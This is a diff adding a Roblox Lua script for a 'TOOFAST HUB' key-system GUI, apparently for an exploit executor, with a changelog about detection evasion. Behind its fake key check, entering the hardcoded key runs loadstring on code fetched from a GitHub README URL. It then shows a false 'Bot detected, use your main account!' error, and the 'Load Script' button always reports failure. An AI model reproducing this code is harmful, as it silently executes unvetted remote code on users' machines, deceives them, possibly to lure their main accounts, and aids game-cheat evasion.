@@ -1,0 +1,534 @@
+local _ScreenGui = Instance.new('ScreenGui')
+local _Frame = Instance.new('Frame')
+local _UICorner = Instance.new('UICorner')
+local _Frame2 = Instance.new('Frame')
+local _UICorner2 = Instance.new('UICorner')
+local _Folder = Instance.new('Folder')
+local _TextLabel = Instance.new('TextLabel')
+local _TextLabel2 = Instance.new('TextLabel')
+local _TextLabel3 = Instance.new('TextLabel')
+local _TextButton = Instance.new('TextButton')
+local _UICorner3 = Instance.new('UICorner')
+local _TextBox = Instance.new('TextBox')
+local _UICorner4 = Instance.new('UICorner')
+local _Folder2 = Instance.new('Folder')
+local _TextButton2 = Instance.new('TextButton')
+local _UICorner5 = Instance.new('UICorner')
+local _TextButton3 = Instance.new('TextButton')
+local _UICorner6 = Instance.new('UICorner')
+local _TextButton4 = Instance.new('TextButton')
+local _UICorner7 = Instance.new('UICorner')
+local _TextButton5 = Instance.new('TextButton')
+local _UICorner8 = Instance.new('UICorner')
+local _Frame3 = Instance.new('Frame')
+local _TextLabel4 = Instance.new('TextLabel')
+local _Folder3 = Instance.new('Folder')
+local _TextLabel5 = Instance.new('TextLabel')
+local _TextLabel6 = Instance.new('TextLabel')
+
+Instance.new('TextLabel')
+
+local _TextButton6 = Instance.new('TextButton')
+local _UICorner9 = Instance.new('UICorner')
+local _Folder4 = Instance.new('Folder')
+local _TextLabel7 = Instance.new('TextLabel')
+local _TextLabel8 = Instance.new('TextLabel')
+local _TextLabel9 = Instance.new('TextLabel')
+local _TextButton7 = Instance.new('TextButton')
+local _UICorner10 = Instance.new('UICorner')
+local _TextLabel10 = Instance.new('TextLabel')
+
+_ScreenGui.Name = 'key'
+
+pcall(function()
+    _ScreenGui.Parent = game:GetService('CoreGui')
+end)
+
+if _ScreenGui.Parent ~= game:GetService('CoreGui') then
+    _ScreenGui.Parent = game:GetService('Players').LocalPlayer:WaitForChild('PlayerGui')
+end
+
+_ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+_ScreenGui.ResetOnSpawn = false
+_Frame.Parent = _ScreenGui
+_Frame.Active = true
+_Frame.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
+_Frame.Draggable = true
+_Frame.Position = UDim2.new(0.266946226, 0, 0.496170878, 0)
+_Frame.Size = UDim2.new(0, 451, 0, 281)
+_UICorner.CornerRadius = UDim.new(0, 16)
+_UICorner.Parent = _Frame
+_Frame2.Parent = _Frame
+_Frame2.BackgroundColor3 = Color3.fromRGB(138, 138, 138)
+_Frame2.Position = UDim2.new(0.0288248342, 0, 0.0462633446, 0)
+_Frame2.Size = UDim2.new(0, 424, 0, 255)
+_UICorner2.CornerRadius = UDim.new(0, 16)
+_UICorner2.Parent = _Frame2
+_Folder.Name = 'info'
+_Folder.Parent = _Frame2
+_TextLabel.Name = 'TextLabelxxd3'
+_TextLabel.Parent = _Folder
+_TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel.BackgroundTransparency = 1
+_TextLabel.BorderSizePixel = 0
+_TextLabel.Position = UDim2.new(0.0349590369, 0, 0.38356024, 0)
+_TextLabel.Size = UDim2.new(0, 112, 0, 31)
+_TextLabel.Visible = false
+_TextLabel.Font = Enum.Font.GothamBlack
+_TextLabel.Text = 'Checking'
+_TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+_TextLabel.TextScaled = true
+_TextLabel.TextSize = 14
+_TextLabel.TextWrapped = true
+_TextLabel2.Name = 'TextLabel3'
+_TextLabel2.Parent = _Folder
+_TextLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel2.BackgroundTransparency = 1
+_TextLabel2.BorderSizePixel = 0
+_TextLabel2.Position = UDim2.new(0.379298657, 0, 0.838462174, 0)
+_TextLabel2.Size = UDim2.new(0, 245, 0, 32)
+_TextLabel2.Visible = false
+_TextLabel2.Font = Enum.Font.GothamBlack
+_TextLabel2.Text = 'Checking'
+_TextLabel2.TextColor3 = Color3.fromRGB(255, 0, 0)
+_TextLabel2.TextScaled = true
+_TextLabel2.TextSize = 14
+_TextLabel2.TextWrapped = true
+_TextLabel3.Parent = _Folder
+_TextLabel3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel3.BackgroundTransparency = 1
+_TextLabel3.BorderSizePixel = 0
+_TextLabel3.Position = UDim2.new(0.378352046, 0, 0.21447216, 0)
+_TextLabel3.Size = UDim2.new(0, 252, 0, 54)
+_TextLabel3.Font = Enum.Font.GothamBlack
+_TextLabel3.Text = 'Welcome to TOOFAST HUB!'
+_TextLabel3.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel3.TextScaled = true
+_TextLabel3.TextSize = 14
+_TextLabel3.TextWrapped = true
+_TextButton.Name = 'usekey'
+_TextButton.Parent = _Folder
+_TextButton.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
+_TextButton.Position = UDim2.new(0.43512395, 0, 0.673756301, 0)
+_TextButton.Size = UDim2.new(0, 197, 0, 34)
+_TextButton.Font = Enum.Font.FredokaOne
+_TextButton.Text = 'Use Key'
+_TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextButton.TextScaled = true
+_TextButton.TextSize = 14
+_TextButton.TextWrapped = true
+_UICorner3.CornerRadius = UDim.new(0, 16)
+_UICorner3.Parent = _TextButton
+_TextBox.Parent = _Folder
+_TextBox.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+_TextBox.Position = UDim2.new(0.379716992, 0, 0.458823532, 0)
+_TextBox.Size = UDim2.new(0, 245, 0, 38)
+_TextBox.ClearTextOnFocus = false
+_TextBox.Font = Enum.Font.SourceSans
+_TextBox.PlaceholderText = 'Key Here'
+_TextBox.Text = ''
+_TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextBox.TextScaled = true
+_TextBox.TextSize = 14
+_TextBox.TextWrapped = true
+_UICorner4.Parent = _TextBox
+_Folder2.Name = 'buttons'
+_Folder2.Parent = _Frame2
+_TextButton2.Name = 'Credits'
+_TextButton2.Parent = _Folder2
+_TextButton2.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
+_TextButton2.Position = UDim2.new(0.0365390405, 0, 0.508589923, 0)
+_TextButton2.Size = UDim2.new(0, 112, 0, 28)
+_TextButton2.Font = Enum.Font.FredokaOne
+_TextButton2.Text = 'Credits'
+_TextButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextButton2.TextScaled = true
+_TextButton2.TextSize = 14
+_TextButton2.TextWrapped = true
+_UICorner5.CornerRadius = UDim.new(0, 16)
+_UICorner5.Parent = _TextButton2
+_TextButton3.Name = 'loadsc'
+_TextButton3.Parent = _Folder2
+_TextButton3.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
+_TextButton3.Position = UDim2.new(0.036539048, 0, 0.211011171, 0)
+_TextButton3.Size = UDim2.new(0, 112, 0, 44)
+_TextButton3.Font = Enum.Font.FredokaOne
+_TextButton3.Text = 'Load Script'
+_TextButton3.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextButton3.TextScaled = true
+_TextButton3.TextSize = 14
+_TextButton3.TextWrapped = true
+_UICorner6.CornerRadius = UDim.new(0, 16)
+_UICorner6.Parent = _TextButton3
+_TextButton4.Name = 'main'
+_TextButton4.Parent = _Folder2
+_TextButton4.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
+_TextButton4.Position = UDim2.new(0.0365390405, 0, 0.771795511, 0)
+_TextButton4.Size = UDim2.new(0, 112, 0, 37)
+_TextButton4.Font = Enum.Font.FredokaOne
+_TextButton4.Text = 'Key'
+_TextButton4.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextButton4.TextScaled = true
+_TextButton4.TextSize = 14
+_TextButton4.TextWrapped = true
+_UICorner7.CornerRadius = UDim.new(0, 16)
+_UICorner7.Parent = _TextButton4
+_TextButton5.Name = 'updates'
+_TextButton5.Parent = _Folder2
+_TextButton5.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
+_TextButton5.Position = UDim2.new(0.0365390405, 0, 0.63800168, 0)
+_TextButton5.Size = UDim2.new(0, 112, 0, 28)
+_TextButton5.Font = Enum.Font.FredokaOne
+_TextButton5.Text = 'Updates'
+_TextButton5.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextButton5.TextScaled = true
+_TextButton5.TextSize = 14
+_TextButton5.TextWrapped = true
+_UICorner8.CornerRadius = UDim.new(0, 16)
+_UICorner8.Parent = _TextButton5
+_Frame3.Parent = _Frame2
+_Frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+_Frame3.BorderSizePixel = 0
+_Frame3.Position = UDim2.new(0.324106753, 0, 0.206629023, 0)
+_Frame3.Size = UDim2.new(0, 2, 0, 182)
+_TextLabel4.Parent = _Frame2
+_TextLabel4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel4.BackgroundTransparency = 1
+_TextLabel4.BorderSizePixel = 0
+_TextLabel4.Position = UDim2.new(0.000522973016, 0, 0.00312607689, 0)
+_TextLabel4.Size = UDim2.new(0, 424, 0, 53)
+_TextLabel4.Font = Enum.Font.GothamBlack
+_TextLabel4.Text = 'TOOFAST HUB - Key System'
+_TextLabel4.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel4.TextScaled = true
+_TextLabel4.TextSize = 14
+_TextLabel4.TextWrapped = true
+_Folder3.Name = 'credits'
+_Folder3.Parent = _Frame2
+_TextLabel5.Name = 'TextLabel1'
+_TextLabel5.Parent = _Folder3
+_TextLabel5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel5.BackgroundTransparency = 1
+_TextLabel5.BorderSizePixel = 0
+_TextLabel5.Position = UDim2.new(0.439672798, 0, 0.3478055, 0)
+_TextLabel5.Size = UDim2.new(0, 193, 0, 23)
+_TextLabel5.Visible = false
+_TextLabel5.Font = Enum.Font.GothamBlack
+_TextLabel5.Text = '#toofasthub'
+_TextLabel5.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel5.TextScaled = true
+_TextLabel5.TextSize = 14
+_TextLabel5.TextWrapped = true
+_TextLabel6.Name = 'TextLabel2'
+_TextLabel6.Parent = _Folder3
+_TextLabel6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel6.BackgroundTransparency = 1
+_TextLabel6.BorderSizePixel = 0
+_TextLabel6.Position = UDim2.new(0.439672798, 0, 0.438001573, 0)
+_TextLabel6.Size = UDim2.new(0, 193, 0, 23)
+_TextLabel6.Visible = false
+_TextLabel6.Font = Enum.Font.GothamBlack
+_TextLabel6.Text = '#toofasthub'
+_TextLabel6.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel6.TextScaled = true
+_TextLabel6.TextSize = 14
+_TextLabel6.TextWrapped = true
+_TextButton6.Name = 'TextLabel0'
+_TextButton6.Parent = _Folder3
+_TextButton6.BackgroundColor3 = Color3.fromRGB(129, 129, 129)
+_TextButton6.Position = UDim2.new(0.445754707, 0, 0.721568644, 0)
+_TextButton6.Size = UDim2.new(0, 187, 0, 34)
+_TextButton6.Visible = false
+_TextButton6.Font = Enum.Font.FredokaOne
+_TextButton6.Text = 'Copy Discord link'
+_TextButton6.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextButton6.TextScaled = true
+_TextButton6.TextSize = 14
+_TextButton6.TextWrapped = true
+_UICorner9.Parent = _TextButton6
+_Folder4.Name = 'updates'
+_Folder4.Parent = _Frame2
+_TextLabel7.Name = 'TextLabel1'
+_TextLabel7.Parent = _Folder4
+_TextLabel7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel7.BackgroundTransparency = 1
+_TextLabel7.BorderSizePixel = 0
+_TextLabel7.Position = UDim2.new(0.359484106, 0, 0.234080121, 0)
+_TextLabel7.Size = UDim2.new(0, 271, 0, 38)
+_TextLabel7.Visible = false
+_TextLabel7.Font = Enum.Font.GothamBlack
+_TextLabel7.Text = '- Made whitelists IP + Account based.'
+_TextLabel7.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel7.TextScaled = true
+_TextLabel7.TextSize = 14
+_TextLabel7.TextWrapped = true
+_TextLabel8.Name = 'TextLabel2'
+_TextLabel8.Parent = _Folder4
+_TextLabel8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel8.BackgroundTransparency = 1
+_TextLabel8.BorderSizePixel = 0
+_TextLabel8.Position = UDim2.new(0.359484136, 0, 0.394864321, 0)
+_TextLabel8.Size = UDim2.new(0, 193, 0, 23)
+_TextLabel8.Visible = false
+_TextLabel8.Font = Enum.Font.GothamBlack
+_TextLabel8.Text = '- Fixed detection'
+_TextLabel8.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel8.TextScaled = true
+_TextLabel8.TextSize = 14
+_TextLabel8.TextWrapped = true
+_TextLabel9.Name = 'TextLabel4'
+_TextLabel9.Parent = _Folder4
+_TextLabel9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel9.BackgroundTransparency = 1
+_TextLabel9.BorderSizePixel = 0
+_TextLabel9.Position = UDim2.new(0.328823745, 0, 0.51643306, 0)
+_TextLabel9.Size = UDim2.new(0, 284, 0, 30)
+_TextLabel9.Visible = false
+_TextLabel9.Font = Enum.Font.GothamBlack
+_TextLabel9.Text = '- Added warning to show if theres mod in the same server'
+_TextLabel9.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel9.TextScaled = true
+_TextLabel9.TextSize = 14
+_TextLabel9.TextWrapped = true
+_TextButton7.Name = 'TextLabel0'
+_TextButton7.Parent = _Folder4
+_TextButton7.BackgroundColor3 = Color3.fromRGB(129, 129, 129)
+_TextButton7.Position = UDim2.new(0.457547158, 0, 0.784313738, 0)
+_TextButton7.Size = UDim2.new(0, 187, 0, 34)
+_TextButton7.Visible = false
+_TextButton7.Font = Enum.Font.FredokaOne
+_TextButton7.Text = 'Copy Discord link'
+_TextButton7.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextButton7.TextScaled = true
+_TextButton7.TextSize = 14
+_TextButton7.TextWrapped = true
+_UICorner10.Parent = _TextButton7
+_TextLabel10.Name = 'TextLabel7'
+_TextLabel10.Parent = _Folder4
+_TextLabel10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel10.BackgroundTransparency = 1
+_TextLabel10.BorderSizePixel = 0
+_TextLabel10.Position = UDim2.new(0.351415098, 0, 0.634080112, 0)
+_TextLabel10.Size = UDim2.new(0, 196, 0, 30)
+_TextLabel10.Visible = false
+_TextLabel10.Font = Enum.Font.GothamBlack
+_TextLabel10.Text = '- fixed loading'
+_TextLabel10.TextColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel10.TextScaled = true
+_TextLabel10.TextSize = 14
+_TextLabel10.TextWrapped = true
+
+Instance.new('LocalScript', _TextButton)
+Instance.new('LocalScript', _TextButton2)
+Instance.new('LocalScript', _TextButton3)
+Instance.new('LocalScript', _TextButton4)
+Instance.new('LocalScript', _TextButton5)
+Instance.new('LocalScript', _TextButton6)
+Instance.new('LocalScript', _TextButton7)
+_TextButton6.MouseButton1Click:Connect(function()
+    pcall(function()
+        setclipboard('CORN')
+    end)
+end)
+_TextButton7.MouseButton1Click:Connect(function()
+    pcall(function()
+        setclipboard('NUTS')
+    end)
+end)
+_TextButton.MouseButton1Click:Connect(function()
+    _TextLabel2.TextColor3 = Color3.fromRGB(0, 0, 0)
+    _TextLabel2.Visible = true
+    _TextLabel2.Text = 'Checking key.'
+
+    wait(0.5)
+
+    _TextLabel2.Text = 'Checking key..'
+
+    wait(0.5)
+
+    _TextLabel2.Text = 'Checking key...'
+
+    wait(0.5)
+
+    if _TextBox.Text ~= '5k1g-l3a9-4be7-c04x' then
+        _TextLabel2.TextColor3 = Color3.fromRGB(255, 0, 4)
+        _TextLabel2.Text = 'Invalid key. If you are sure this key is valid, please try re-using it or try again later.'
+
+        wait(3)
+
+        _TextLabel2.Visible = false
+    else
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/ALPHAneegy/tothao99/refs/heads/main/README.md'))()
+        wait(0.5)
+
+        _TextLabel2.TextColor3 = Color3.fromRGB(255, 0, 4)
+        _TextLabel2.Text = 'Bot detected, use your main account!'
+
+        wait(3)
+
+        _TextLabel2.Visible = false
+    end
+end)
+_TextButton3.MouseButton1Click:Connect(function()
+    _TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+    _TextLabel.Visible = true
+    _TextLabel.Text = 'Checking whitelist.'
+
+    wait(0.5)
+
+    _TextLabel.Text = 'Checking whitelist..'
+
+    wait(0.5)
+
+    _TextLabel.Text = 'Checking whitelist...'
+
+    wait(0.5)
+
+    _TextLabel.TextColor3 = Color3.fromRGB(255, 0, 4)
+    _TextLabel.Text = 'No key redeemed!.'
+
+    wait(2)
+
+    _TextLabel.Visible = false
+end)
+_TextButton2.MouseButton1Click:Connect(function()
+    local v37 = _Folder
+    local v38, v39, v40 = pairs(v37:GetChildren())
+
+    while true do
+        local v41
+
+        v40, v41 = v38(v39, v40)
+
+        if v40 == nil then
+            break
+        end
+        if v41.Name ~= 'TextLabelxxd3' then
+            v41.Visible = false
+        end
+    end
+
+    local v42 = _Folder4
+    local v43, v44, v45 = pairs(v42:GetChildren())
+
+    while true do
+        local v46
+
+        v45, v46 = v43(v44, v45)
+
+        if v45 == nil then
+            break
+        end
+
+        v46.Visible = false
+    end
+
+    local v47 = _Folder3
+    local v48, v49, v50 = pairs(v47:GetChildren())
+
+    while true do
+        local v51
+
+        v50, v51 = v48(v49, v50)
+
+        if v50 == nil then
+            break
+        end
+
+        v51.Visible = true
+    end
+end)
+_TextButton4.MouseButton1Click:Connect(function()
+    local v52 = _Folder3
+    local v53, v54, v55 = pairs(v52:GetChildren())
+
+    while true do
+        local v56
+
+        v55, v56 = v53(v54, v55)
+
+        if v55 == nil then
+            break
+        end
+
+        v56.Visible = false
+    end
+
+    local v57 = _Folder4
+    local v58, v59, v60 = pairs(v57:GetChildren())
+
+    while true do
+        local v61
+
+        v60, v61 = v58(v59, v60)
+
+        if v60 == nil then
+            break
+        end
+
+        v61.Visible = false
+    end
+
+    local v62 = _Folder
+    local v63, v64, v65 = pairs(v62:GetChildren())
+
+    while true do
+        local v66
+
+        v65, v66 = v63(v64, v65)
+
+        if v65 == nil then
+            break
+        end
+        if v66.Name ~= 'TextLabel3' and v66.Name ~= 'TextLabelxxd3' then
+            v66.Visible = true
+        end
+    end
+end)
+_TextButton5.MouseButton1Click:Connect(function()
+    local v67 = _Folder3
+    local v68, v69, v70 = pairs(v67:GetChildren())
+
+    while true do
+        local v71
+
+        v70, v71 = v68(v69, v70)
+
+        if v70 == nil then
+            break
+        end
+
+        v71.Visible = false
+    end
+
+    local v72 = _Folder
+    local v73, v74, v75 = pairs(v72:GetChildren())
+
+    while true do
+        local v76
+
+        v75, v76 = v73(v74, v75)
+
+        if v75 == nil then
+            break
+        end
+        if v76.Name ~= 'TextLabel3' and v76.Name ~= 'TextLabelxxd3' then
+            v76.Visible = false
+        end
+    end
+
+    local v77 = _Folder4
+    local v78, v79, v80 = pairs(v77:GetChildren())
+
+    while true do
+        local v81
+
+        v80, v81 = v78(v79, v80)
+
+        if v80 == nil then
+            break
+        end
+
+        v81.Visible = true
+    end
+end)
